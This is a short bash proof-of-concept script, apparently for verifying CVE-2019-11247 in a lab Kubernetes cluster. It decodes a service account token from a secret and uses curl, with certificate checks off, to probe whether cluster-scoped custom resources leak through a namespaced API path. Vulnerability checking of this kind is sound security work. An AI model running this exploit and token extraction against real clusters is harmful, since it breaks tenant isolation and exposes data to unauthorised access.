#!/usr/bin/env bash
set -euo pipefail

NS=tenant-a

SECRET=$(kubectl -n "$NS" get sa poc -o jsonpath='{.secrets[0].name}')
TOKEN=$(kubectl -n "$NS" get secret "$SECRET" -o jsonpath='{.data.token}' | base64 -d)
API_SERVER=$(kubectl config view -o jsonpath='{.clusters[0].cluster.server}')

echo "[*] Using token: ${TOKEN:0:20}..."
echo "[*] API_SERVER: $API_SERVER"

echo
echo "[*] Direct cluster-scoped widgets (should be 403 on fixed servers):"
curl -sk -H "Authorization: Bearer $TOKEN" \
  "${API_SERVER}/apis/example.com/v1/widgets" | jq '.status,.reason,.message' || true

echo
echo "[*] Namespaced path (CVE-2019-11247 pattern):"
curl -sk -H "Authorization: Bearer $TOKEN" \
  "${API_SERVER}/apis/example.com/v1/namespaces/tenant-a/widgets" | jq '.kind,.items[].metadata.name' || true

